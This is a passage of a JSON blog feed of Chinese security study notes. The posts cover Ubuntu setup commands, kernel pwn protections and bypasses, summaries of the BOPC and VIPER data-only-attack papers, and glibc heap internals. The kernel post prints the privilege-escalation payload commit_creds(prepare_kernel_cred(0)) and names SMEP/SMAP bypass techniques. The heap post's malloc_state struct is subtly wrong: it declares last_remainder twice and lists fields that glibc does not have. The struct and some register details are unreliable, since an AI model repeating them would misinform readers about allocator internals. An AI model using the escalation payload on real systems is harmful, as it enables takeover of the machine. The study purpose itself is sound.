<span class=\"token function\">install</span> <span class=\"token parameter variable\">--reinstall</span> ubuntu-desktop\n<span class=\"token comment\"># 一般执行完上面一条就进去了</span>\n<span class=\"token function\">sudo</span> <span class=\"token function\">apt-get</span> <span class=\"token function\">install</span> unity\n<span class=\"token function\">sudo</span> <span class=\"token function\">service</span> lightdm resta<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"建立python与python3之间的软连接\"><a href=\"#建立python与python3之间的软连接\" class=\"headerlink\" title=\"建立python与python3之间的软连接\"></a>建立python与python3之间的软连接</h4><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">sudo</span> <span class=\"token function\">ln</span> <span class=\"token parameter variable\">-s</span> /usr/bin/python3 /usr/bin/python<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n",
            "tags": [
                "clash"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2023/07/13/kernel-pwn/",
            "url": "https://alazymechnaic.github.io/2023/07/13/kernel-pwn/",
            "title": "kernel_pwn",
            "date_published": "2023-07-13T12:41:24.000Z",
            "content_html": "<h2 id=\"Kernel-PWN\"><a href=\"#Kernel-PWN\" class=\"headerlink\" title=\"Kernel PWN\"></a>Kernel PWN</h2><hr>\n<p><img data-src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202309172016734.png\" alt=\"image-20230713204349079\"></p>\n<h3 id=\"内核保护技术\"><a href=\"#内核保护技术\" class=\"headerlink\" title=\"内核保护技术\"></a>内核保护技术</h3><ul>\n<li><p><strong>SMAP/SMEP</strong>: </p>\n<ul>\n<li><em>arm里面叫PXN(Privilege Execute Never)和PAN(Privileged Access Never)。</em><ul>\n<li>SMAP(Supervisor Mode Access Prevention，管理模式访问保护): 禁止内核访问用户空间数据</li>\n<li>SMEP(Supervisor Mode Execution Prevention，管理模式执行保护): 禁止内核访问用户代码区域</li>\n<li>使用cat /proc/cpuinfo指令查看当前程序中存在的SMAP/SMEP功能是否支持，<strong>win8之后开始支持SMEP，并且在RC4中设置适当的位来表示应该强制执行SMEP，可以通过ROP或者jmp到一个RWX的内核地址来绕过</strong>。linux内核从3.0开始支持SMEP，3.7开始支持SMAP。</li>\n</ul>\n</li>\n<li>ret2User: 在没有SMAP/SMEP保护的情况下将内核指针重定向到用户空间进行漏洞利用</li>\n<li>ret2dir:  physmap区域由内核管理并且由虚拟地址直接映射到物理地址。（也就时可以直接访问实际物理内存的内容）。在用户进行vmmap操作的时候，有很大概率能够将当前内存写入到该物理内存中，而内核又是可以直接访问该区域的，因此可以bypass SMAP/SMEP 参考文献： <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC8zYzY2MmI2MTYzYTc=\">https://www.jianshu.com/p/3c662b6163a7</span></li>\n</ul>\n</li>\n<li><p><strong>stack protector</strong>:  在编译内核时选择<em>CONFIG_CC_STACKPROTECTOR</em>选项开启该保护，功能类似canary</p>\n</li>\n<li><p><strong>Kernel Address Display Restrict</strong> ：限制内核地址显示，当攻击者试图开发通用性更强的漏洞利用程序时，他们通常需要知道内核结构的位置。 通过将内核地址视为敏感信息，常规本地用户无法看到那些地址。 从Ubuntu 11.04开始，/ proc / sys / kernel / kptr_restrict设置为“ 1”，以阻止报告已知的内核地址泄漏。 此外，只有root用户才能读取各种文件和目录：/boot/vmlinuz<em>、/boot/System.map</em>、/sys/kernel/debug/、/proc/slabinfo</p>\n</li>\n<li><h3 id=\"Kernel-Address-Space-Layout-Randomisation：\"><a href=\"#Kernel-Address-Space-Layout-Randomisation：\" class=\"headerlink\" title=\"Kernel Address Space Layout Randomisation：\"></a>Kernel Address Space Layout Randomisation：</h3><ul>\n<li>内存地址随机化，类似一般程序中的地址随机化，只不过是发生在内核</li>\n</ul>\n</li>\n</ul>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token function\">commit_creds</span><span class=\"token punctuation\">(</span><span class=\"token function\">prepare_kernel_cred</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">// prepare_kernel_cred(0) 用0为参数生成一个root权限的结构体，并将其传递给commit_creds</span>\n<span class=\"token comment\">// commit_creds 用于将当前结构体设置为当前程序的凭证</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h2 id=\"安装qemu启动一个Linux内核调试试一下\"><a href=\"#安装qemu启动一个Linux内核调试试一下\" class=\"headerlink\" title=\"安装qemu启动一个Linux内核调试试一下\"></a>安装qemu启动一个Linux内核调试试一下</h2><h3 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h3><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYnMua2FueHVlLmNvbS90aHJlYWQtMjYyNDI1Lmh0bQ==\">https://bbs.kanxue.com/thread-262425.htm</span></p>\n",
            "tags": [
                "kernel pwn"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2023/07/04/bopc-data-only-attack/",
            "url": "https://alazymechnaic.github.io/2023/07/04/bopc-data-only-attack/",
            "title": "BOPC_Data_Only_Attack",
            "date_published": "2023-07-04T09:09:42.000Z",
            "content_html": "<h2 id=\"Block-Oriented-Programming-Automating-Data-Only-Attacks\"><a href=\"#Block-Oriented-Programming-Automating-Data-Only-Attacks\" class=\"headerlink\" title=\"Block Oriented Programming: Automating Data-Only Attacks\"></a>Block Oriented Programming: Automating Data-Only Attacks</h2><hr>\n<p>目的： 能够依照代码块组指出包含特定语义的结构。构造出了一种自己的语言SPL，生成SPL payload来组织成特定的语义。</p>\n<p>前提： 一个任意内存写原语（能够向任意位置中写入任意值），一个任意内存读原语（可选），以及执行完上述两个原语后自然到达的位置。（其实本质上来讲改文章的贡献在于如何充分利用给一个AWP(任意内存写原语)</p>\n<p>流程：</p>\n<ul>\n<li>BOPC提供了一个面向exploit编程的语言SPL，使分析人员能够定义一个独立于目标问题和底层架构的exploit</li>\n<li>在目标程序中搜索相应的功能块作为基本块</li>\n<li>搜索Dispatcher块用于将各个功能块链接在一起</li>\n<li>依照AWP构造出相应的BOP链的payload</li>\n</ul>\n<p>关键技术：</p>\n<p><strong>Block Oriented Programming</strong>：</p>\n<ul>\n<li>BOP链由表示一条SPL语义的BOP gadget和链接这些BOP gadget的DIspatcher组成</li>\n<li>将每个基本块抽象为块约束摘要便于与SPL语言的一一对应。但是由于进入该块的时候上下文的不同，每一个块可能会表现出不同的功能（这里怎么进行抽象的？</li>\n<li>构造BOP链本身是NP难的问题</li>\n</ul>\n<p><strong>Block Constraint Summaries</strong>：  </p>\n<p>​\t将程序的输入映射到程序执行路径是NP难的问题，<strong>使用启发式的方法帮助查找路径中所有可能的路径</strong>。</p>\n<ul>\n<li><p>对单个块做符号执行，收集约束，做出输入与输出之间的映射关系。</p>\n</li>\n<li><p>要查找块和SPL语句之间的匹配，块必须执行该SPL语句所需的所有操作。</p>\n</li>\n<li><p>BOPC依照语义计算一组候选功能块和相应的分发器，但是很可能选出的几个gadget之间并不存在合法的路径，或者符合CFI的路径</p>\n</li>\n<li><p>BOP gadget依照选取的块不同，其本身也是不稳定的，前面的gadget很可能会改变后面gadget的性质，同时不断增加gadget也会增加当前路径的约束</p>\n</li>\n</ul>\n<p><strong>解决方案</strong>：BOPC使用当前程序的BOP块的接近度用于评分排序，以及delta图来组织BOP gadget序列</p>\n<ul>\n<li><strong>BOP块接近度</strong>：</li>\n<li><strong>delta图</strong>：用于表示当前搜寻分发器block的状态。<ul>\n<li>存储每一个功能块到下一个候选块之前的最短路径</li>\n<li>任意拼接两个块之间的路径本身是一个NP难的问题</li>\n<li>功能块之间的选择依据是，更短的路径可能会导致更合适的约束</li>\n<li>delta图中记录了每一个功能块，功能块的边是两个功能块之间转移需要经过的block数量.（但是在计算两个block之间的路径时，静态CFG上是可以有多个重点，但在实际执行时只会有一个终点。其实就是对控制流进行枚举的过程，你怎么知道实际路径是哪些的</li>\n<li>文章提出的路径算法是迪杰斯特拉算法的递归版本，并且避免了所有的破坏块。<ul>\n<li>迪杰斯特拉算法：不断加入新的结点作为中间跳转结点，计算出最短距离</li>\n<li>算法逻辑：初始分析时将相邻的边的开销设置为1。当其遇到call指令时，就进行递归地计算，找到每个功能块之间的最短路径</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>BOP gadget缝合：<ul>\n<li>从每一个BOPgadget开始不断向后进行符号执行读入新的BOP功能块，直到最后一个块。</li>\n</ul>\n</li>\n</ul>\n<p>在进行组织的过程中需要在BOP gadget间拼接不会影响当前程序执行流的基本块。使用delta 图来搜索当前所有的调度块。</p>\n",
            "tags": [
                "paper"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2023/06/27/viper-ssgvdoa/",
            "url": "https://alazymechnaic.github.io/2023/06/27/viper-ssgvdoa/",
            "title": "VIPER_SSGVDOA",
            "date_published": "2023-06-27T01:50:02.000Z",
            "content_html": "<h2 id=\"VIPER-Spotting-Syscall-Guard-Variables-for-Data-Only-Attacks\"><a href=\"#VIPER-Spotting-Syscall-Guard-Variables-for-Data-Only-Attacks\" class=\"headerlink\" title=\"VIPER: Spotting Syscall-Guard Variables for Data-Only Attacks\"></a>VIPER: Spotting Syscall-Guard Variables for Data-Only Attacks</h2><hr>\n<h3 id=\"摘要\"><a href=\"#摘要\" class=\"headerlink\" title=\"摘要\"></a>摘要</h3><ul>\n<li>文章的主要目的是检查那些影响数据流，促使程序运行至关键系统调用的关键变量。VIPER能够自动化地查找实现对系统调用保护分支和变量的自动和可扩展检测</li>\n<li>两个关键定义：Syscall-Guard Variables，syscallguard变量决定是否调用与安全相关的系统调用 ，因此它们的值对程序安全性有直接影响。这意味着它们应该被视为关键数据。同样也衍生出，syscall-Guard branch，用于决定是否会执行当前的系统调用。</li>\n<li>一个关键方法： 文章提出了分支强制（branch force），它有意地翻转执行过程中的每个条件分支，并检查是否调用了新的与安全相关的syscalls。如果是，则进行数据流分析以估计通过常见内存错误翻转这些分支的可行性。</li>\n<li>基本逻辑：程序想要通过数据流攻击实现一定的攻击语义，必须要依赖于一定的系统调用实现。然而系统调用在处理不受信任的输入前一定会存在一定的检查操作。</li>\n</ul>\n<h3 id=\"识别困难\"><a href=\"#识别困难\" class=\"headerlink\" title=\"识别困难\"></a>识别困难</h3><p>​\t关键变量可能会以任何数据类型，任何存储位置存在。这会导致传统的分析方式失效。况且对于大型程序，进行变量的推断是十分困难的。</p>\n<h3 id=\"攻击的前提\"><a href=\"#攻击的前提\" class=\"headerlink\" title=\"攻击的前提\"></a>攻击的前提</h3><ul>\n<li>不管程序是什么，大多数纯数据攻击都依赖于与安全相关的系统 调用(简称系统调用)来实现最终目标。（其实就是最终的攻击语义一定要依赖于系统调用的存在）</li>\n<li>关键的系统调用函数前一定会存在一些分支检查</li>\n</ul>\n<h3 id=\"技术方案\"><a href=\"#技术方案\" class=\"headerlink\" title=\"技术方案\"></a>技术方案</h3><ul>\n<li>使用相同的输入进入程序，找到分支，进行强制跳转。如果强制跳转之后触发了程序的bug，那么该分支就作为候选分支</li>\n<li>在一次执行中翻转分支条件，找到新的分支条件生成新的路径，查找新的系统调用</li>\n</ul>\n<h3 id=\"challenge\"><a href=\"#challenge\" class=\"headerlink\" title=\"challenge\"></a>challenge</h3><ul>\n<li>修剪掉无用的分支，并且评估单个变量的影响是十分有挑战性的。符号执行能够找到从程序入口到关键系统调用的路径，但是并不能给出，当前路径上的哪些分支是更重要的，因此只能对所有的分支都做分析</li>\n<li>找到一种高效的分析方法很困难，使用间接函数调用的程序太多了，使用静态分析十分不切实际</li>\n</ul>\n<h3 id=\"approaches\"><a href=\"#approaches\" class=\"headerlink\" title=\"approaches\"></a>approaches</h3><ul>\n<li><strong>branch force</strong>：收集候选的分支变量<ul>\n<li>思想：假设当前分支时关键保护分支，那么该分支向后执行仅仅只能有其中一个分支触发当前程序中的系统调用，如果两个都能触发，那这个分支肯定不是关键保护分支。如果都不能触发，则该分支对于当前程序的安全性并不重要。</li>\n<li>执行流程：<ul>\n<li>以相同的输入I执行程序，将遇到的每一个分支进行强制翻转（并不改变输入），并且</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<p><img data-src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202309172016500.png\" alt=\"image-20230628155213365\"></p>\n<ul>\n<li><strong>dynamic backward data-flow</strong>：检查每个变量被覆盖利用的可能性</li>\n<li><strong>Corruptibility Assessment</strong> ： 使用数据流来评估每一个分支变量被内存错误污染的可能性。同时使用动态数据流分析，在过程中根据变量的存储位置和内存的声明周期对内存进行定性，分别视为容易利用和难利用三种等级。全局变量相对局部变量更容易被利用，生命周期越长，被修改次数越多，能被利用的概率越高。依此能够筛选出被破坏概率更高的关键变量。</li>\n</ul>\n<h3 id=\"整体流程\"><a href=\"#整体流程\" class=\"headerlink\" title=\"整体流程\"></a>整体流程</h3><p><img data-src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202309172016755.png\" alt=\"image-20230628205325968\"></p>\n<p>VIPER在对程序分析后，最终会报告当前程序中存在的各种危险的关键分支，系统调用及其保护变量。</p>\n<p>​\tBranchForcer运行包含原始输入的程序，并记录执行的分支和系统调用。然后，使用相同的输入多次运行程序，并为每次新的执行翻转一个不同分支的目标。如果重新执行触发了新的与安全性相关的系统调用，我们将当前分支添加到候选列表中。对于每个候选分支，VariableRator再次运行程序，以记录执行的完整跟踪，包括分支序列、所有内存访问地址和进程内存布局。利用记录的轨迹对程序IR进行反向数据流分析。VariableRator检查内存布局以确定每个内存节点的位置，并计算内存写指令的数量以估计节点的生命周期</p>\n<h3 id=\"分支记录\"><a href=\"#分支记录\" class=\"headerlink\" title=\"分支记录\"></a>分支记录</h3><p>​\t由于在执行的过程中可能会出现路径爆炸以及某些分支翻转了没有意义，因此只在固定路径上做分支翻转。每个分支只会做一次翻转。为了提高效率，使用多线程尽心探索。</p>\n<p>​\t每次使用相同的输入和不同的分支翻转执行程序，如果遇到新的系统调用就将当前路径做为候选路径进行存储，然后进行完整的分支执行分析，利用数据流进行后向切片，确定所有与分支保护状态相关的指令。利用值集分析来找到控制变量中所有可能的值。</p>\n<p>​\t</p>\n",
            "tags": [
                "paper"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2023/05/12/blind-rop/",
            "url": "https://alazymechnaic.github.io/2023/05/12/blind-rop/",
            "title": "blind-rop",
            "date_published": "2023-05-12T12:28:01.000Z",
            "content_html": "",
            "tags": []
        },
        {
            "id": "https://alazymechnaic.github.io/2023/05/12/heap-exp-heap-management/",
            "url": "https://alazymechnaic.github.io/2023/05/12/heap-exp-heap-management/",
            "title": "HEAP-EXP-heap_management",
            "date_published": "2023-05-12T11:47:55.000Z",
            "content_html": "<h1 id=\"堆利用\"><a href=\"#堆利用\" class=\"headerlink\" title=\"堆利用\"></a>堆利用</h1><hr>\n<p>​\t本文用于介绍当前堆管理方式，堆溢出原理，常见的攻击方式及相关例题题解。</p>\n<h2 id=\"堆管理机制\"><a href=\"#堆管理机制\" class=\"headerlink\" title=\"堆管理机制\"></a>堆管理机制</h2><p>​\t堆区域与栈区域在内存使用上存在不同：</p>\n<ul>\n<li>堆位于当前程序中较低的地址位置，栈位于当前程序中的较高内存空间位置</li>\n<li>堆在使用时从低地址内存向高地址内存增长，栈从高地址内存向低地址内存增长</li>\n<li><strong>堆和栈都可以是每个线程所有独有的，堆依然存在线程堆的概念</strong></li>\n</ul>\n<p><img data-src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202309172015938.png\" alt=\"先知社区https://xz.aliyun.com/t/10650\"></p>\n<p>(上图中的共享库段中包含有不同权限的几个内存段，如下图所示，其中mapped区域是当前so文件代码段对应的heap段)</p>\n<p><img data-src=\"/HEAP-EXP-heap-management.assets/image-20230613200729790.png\" alt=\"image-20230613200729790\"></p>\n<h2 id=\"内存管理\"><a href=\"#内存管理\" class=\"headerlink\" title=\"内存管理\"></a>内存管理</h2><ul>\n<li>32位下的text段是即时elf文件装入操作系统的起始位置0x8048000，也就是整个虚拟内存中用户可用的起始位置,最远的访问位置到0xbfffffff.</li>\n<li>64位下的内存起始位置在0x0000000000400000处，64位下总的内存大小为2的48次方，</li>\n</ul>\n<h4 id=\"内存的分配管理策略\"><a href=\"#内存的分配管理策略\" class=\"headerlink\" title=\"内存的分配管理策略\"></a>内存的分配管理策略</h4><ul>\n<li>具有较长生命周期的大内存使用mmap进行分配（例如说，在初始化给用户分配堆的过程）</li>\n<li>特别大的内存分配使用的是mmap，<strong>使用mmap申请的内存在释放后并不会放入bin，而是直接还给操作系统，因为这一部分内存块一般都比较大</strong></li>\n<li>短生命周期的内存分配使用brk，因为使用mmap分配的内存块需要多个物理页，浪费资源</li>\n<li>空闲小块是被管理，大内存块和长生命周期块都是直接回收返还给内存</li>\n<li>对于空闲的小内存块只会在malloc和free的时候进行合并，free后的空闲块可能放入pool中</li>\n<li><strong>注意一点，在程序运行初期会使用brk分配一个内存空间，该内存空间中的内容再被用户进行各种malloc的分配，该分配区域被称作为主分配区，由brk和sbrk两个指针限定边缘。如果当前的heap0中有合适的小内存块就直接分配，但是当使用free时，合并后的chunk大小大于64kb时才会将顶端的空闲内存返回给操作系统</strong></li>\n</ul>\n<h4 id=\"arena分配区机制\"><a href=\"#arena分配区机制\" class=\"headerlink\" title=\"arena分配区机制\"></a>arena分配区机制</h4><ul>\n<li>arena就是mmap heap1/heap2等，该分配区一旦产生就不能再减少。每个arena中都使用独立的bin机制来管理当前线程的内存块，<strong>但是如果是单线程程序也可以拥有多个arena</strong>，多个线程存在时，在malloc后可以使用其他线程的arena来分配内存：<ul>\n<li>首先循环遍历所有可用的 <em>arena</em>，在遍历的过程中，它会尝试加锁该 <em>arena</em>。如果成功加锁（该 <em>arena</em> 当前对应的线程并未使用堆内存则表示可加锁），比如将 <em>main arena</em> 成功锁住，那么就将 <em>main arena</em> 返回给用户，即表示该 <em>arena</em> 被子线程 3 共享使用。</li>\n<li>如果没能找到可用的 <em>arena</em>，那么就将子线程 3 的 <code>malloc</code> 操作阻塞，直到有可用的 <em>arena</em> 为止</li>\n<li>现在，如果子线程 3 再次调用 <code>malloc</code> 的话，<code>glibc</code> 的 <code>malloc</code> 就会先尝试使用最近访问的 <em>arena</em>（此时为 <em>main arena</em>）。如果此时 <em>main arena</em> 可用的话，就直接使用，否则就将子线程 3 阻塞，直到 <em>main arena</em> 再次可用为止。</li>\n</ul>\n</li>\n<li>在创建非主分配区时会先mmap创建分为一块较大的内存空间来模拟sub-heap（也就是类似主分配区的heap段），当然有heap就有top段的内容，topchunk是永远不会放在bin中的，因为top chunk总是在fast bin与bin之后被考虑。</li>\n<li>每个进程只能有一个主分配区，但有多个非主分配区<ul>\n<li>主分配区可以使用brk和mmap两种方式进行内存的分配</li>\n<li>非主分配区只能使用mmap的方式进行内存的分配，但与主分配区相同，都使用链表进行管理</li>\n<li>同样在多线程下，主线程能够使用主分配区，当然其他线程也可以，线程之间对于堆内存的访问是不存在限制的，因此其他线程也是能够释放主线程内存的，但是分配区存在锁机制，对分配区的操作要进行互斥。线程在使用内存时，只能通过先用mmap申请一块大内存（32位默认1MB，64位默认64MB）到用户空间，再使用malloc一点一点分配出去。这个mmap分出来的这块内存就是非主分配区，管理这块内存的就是arena</li>\n<li>可以看到一个线程只能有一个分配区（arena）但是一个arena可以管理多个堆块，主分配区域只需要管理一个堆块就可以了，就是使用brk分配的那个。</li>\n<li>多线程环境下内存的分配与回收：<ul>\n<li>查看当前线程下是否存在一个分配区，若存在一个分配区则尝试加锁，进行后续操作；如果加锁失败，则让分配器循环遍历arena，找到没有加锁的arena进行内存的分配操作；若所有的arena都在用，则使用malloc重新开辟一个新的内存空间，构造一个新的分配区；</li>\n<li>当进行内存的释放时，内存所在的分配区被加锁则等待，直到互斥锁被解开之后才能继续使用。</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>进一步的，每个arena管理的heap可以抽象成一个在地址上连续的内存片段，内存片段被抽象为无数个chunk未被分配的chunk都视为top chunk，对于已经释放的free chunk部分则会使用一个双向链表进行管理，每次在分配时会遍历这个双向链表选择最合适的内存块，而管理各种不同的空闲块的管理器就是bin机制。</li>\n</ul>\n<h2 id=\"堆管理的数据结构\"><a href=\"#堆管理的数据结构\" class=\"headerlink\" title=\"堆管理的数据结构\"></a>堆管理的数据结构</h2><h3 id=\"heap-info\"><a href=\"#heap-info\" class=\"headerlink\" title=\"heap_info\"></a>heap_info</h3><p>​\t一个程序在运行时不只是存在一个主线程的heap，还会存在其他线程的heap（使用mmap申请的heap，使用该线程的arena进行管理），那么这些heap的信息需要使用一个heap_info 的结构进行管理，所以这部分的结构也叫作heap header。</p>\n<p>​\t主线程的堆不是分配在内存映射区，而是进程的虚拟内存堆区，因此不含有多个 <em>heap</em> 所以也就不含有 <code>heap_info</code> 结构体。当需要更多堆空间的时候，直接通过增长 <code>brk</code> 指针来获取更多的空间，直到它碰到内存映射区域为止</p>\n<p>​\t依照该数据结构的情况能够看到：</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">struct</span> <span class=\"token class-name\">heap_info</span>\n<span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">heap_info</span> <span class=\"token operator\">*</span>prev<span class=\"token punctuation\">;</span>  <span class=\"token comment\">//指向前一个heap_info结构</span>\n  <span class=\"token class-name\">size_t</span> size<span class=\"token punctuation\">;</span>  <span class=\"token comment\">//当前heap_info结构所描述的堆内存大小</span>\n  <span class=\"token keyword\">int</span> mmaped<span class=\"token punctuation\">;</span>  <span class=\"token comment\">//标记当前堆内存是否由mmap系统调用分配</span>\n  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">heap_info</span> <span class=\"token operator\">*</span>next<span class=\"token punctuation\">;</span>  <span class=\"token comment\">//指向后一个heap_info结构</span>\n  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">arena</span> <span class=\"token operator\">*</span>ar_ptr<span class=\"token punctuation\">;</span>  <span class=\"token comment\">//指向当前堆内存所在的arena</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"malloc-state\"><a href=\"#malloc-state\" class=\"headerlink\" title=\"malloc_state\"></a>malloc_state</h3><p><code>malloc_state</code> 用于表示 <em>arena</em> 的信息，因此也被称为 <em>arena header</em>，每个线程只含有一个 <em>arena header</em>。<em>arena header</em> 包含 <em>bin</em>、<em>top chunk</em> 以及 <em>last remainder chunk</em> 等信息</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">struct</span> <span class=\"token class-name\">malloc_state</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token class-name\">binmap_t</span>     binmap<span class=\"token punctuation\">[</span>BINMAPSIZE<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 用于标记哪些 bin 是非空的</span>\n  mfastbinptr  fastbinsY<span class=\"token punctuation\">[</span>NFASTBINS<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 用于存放小块内存的链表</span>\n  mchunkptr    top<span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 指向当前 arena 中最后一个已分配的 chunk</span>\n  mchunkptr    last_remainder<span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 指向上一个 arena 中未被使用完的 chunk</span>\n  mchunkptr    bins<span class=\"token punctuation\">[</span>NBINS <span class=\"token operator\">*</span> <span class=\"token number\">2</span> <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 用于存放各个 bin 中的 chunk</span>\n  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">malloc_state</span> <span class=\"token operator\">*</span>next<span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 指向下一个 malloc_state 结构</span>\n  <span class=\"token class-name\">uint64_t</span>     magic<span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 用于检查 malloc_state 结构的完整性</span>\n  <span class=\"token class-name\">uint64_t</span>     flags<span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 保存了 malloc_state 的各种状态信息</span>\n  <span class=\"token class-name\">mutex_t</span>      mutex<span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 用于保护 malloc_state 结构的互斥锁</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>       seg<span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 指向当前 arena 的起始地址</span>\n  <span class=\"token class-name\">size_t</span>       size<span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 当前 arena 的大小</span>\n  <span class=\"token class-name\">size_t</span>       mprotect_size<span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 当前 arena 中已经保护的内存大小</span>\n  mchunkptr    mprotect_base<span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 当前 arena 中已经保护的内存的起始地址</span>\n  mchunkptr    last_remainder<span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 上一个 arena 中未被使用完的 chunk</span>\n  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">heap_info</span> <span class=\"token operator\">*</span>heap_info<span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 当前 arena 所在的 heap_info 结构</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h3 id=\"chunk的组织形式\"><a href=\"#chunk的组织形式\" class=\"headerlink\" title=\"chunk的组织形式\"></a>chunk的组织形式</h3><pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">struct</span> <span class=\"token class-name\">malloc_chunk</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token comment\">/* #define INTERNAL_SIZE_T size_t */</span>\n  INTERNAL_SIZE_T      prev_size<span class=\"token punctuation\">;</span>  <span class=\"token comment\">/* 记录前一个chunk的大小，如果前一个chunk是free状态，此字段依然有用 ,而且该size的计算并不不包含前一个chunk的chunk头*/</span>\n  INTERNAL_SIZE_T      size<span class=\"token punctuation\">;</span>       <span class=\"token comment\">/* 指向在bin中时前一个chunk和后一个chunk的位置，因此只有空闲状态的chunk使用 */</span>\n  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">malloc_chunk</span><span class=\"token operator\">*</span> fd<span class=\"token punctuation\">;</span>    \n  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">malloc_chunk</span><span class=\"token operator\">*</span> bk<span class=\"token punctuation\">;</span>\n\t<span class=\"token comment\">/* 上下这两个指针占用相同的空间 区别在于当前chunk是free的时候*/</span>\n  <span class=\"token comment\">/* Only used for large blocks: pointer to next larger size.  */</span>\n  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">malloc_chunk</span><span class=\"token operator\">*</span> fd_nextsize<span class=\"token punctuation\">;</span> <span class=\"token comment\">/* double links -- used only if free. */</span>\n  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">malloc_chunk</span><span class=\"token operator\">*</span> bk_nextsize<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<ul>\n<li>chunk在32位下的8字节对齐，在64位下的16字节对齐，因此allocater返回的chunk要比实际需要的稍大一些</li>\n<li>基本的chunk分配策略是首先在先前释放的chunk中找到合适的，如果没有择取heap区域的chunk</li>\n<li>如果上面的方法均不成功，则会去要求系统新分配一块内存mmap方法</li>\n</ul>\n<p><strong>已分配chunk的数据结构情况</strong></p>\n<p><img data-src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202309172016938.png\" alt=\"image-20230613234305496\"></p>\n<p><strong>未分配的chunk数据结构情况</strong></p>\n<p><img data-src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202309172016286.png\" alt=\"image-20230613234401273\"></p>\n<p>​\t在上面能够很明显的看到chunk在使用状态下原本存放fd和bk的位置会被直接用来存放用户数据。用户在使用malloc时返回的内存指针是指向chunk头后面的部分，在free后指向的fd的存放位置。</p>\n<p>​\t这里的p是标志前一个chunk（地址更小的）是否处于被使用的状态，如果是则置位1，且prev_size有效（标志相邻的堆块大小，这里是指物理上相邻，主要用于进行内存块的合并操作，<strong>且prev_size的大小指的是包含当前块头部和用户数据的部分</strong>）</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">N：是不是「主分配区」分配的内存 1 表示不是主分配区分配的，0 表示是主分配区分配的\n\nM：是不是 Memory Mapped 分配的内存，1 表示是，0 表示是 heap\n\nP：表示前一个 chunk 是否在使用，在初始化的时候通常为 1，防止使用不能访问的内存<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><span class=\"exturl\" 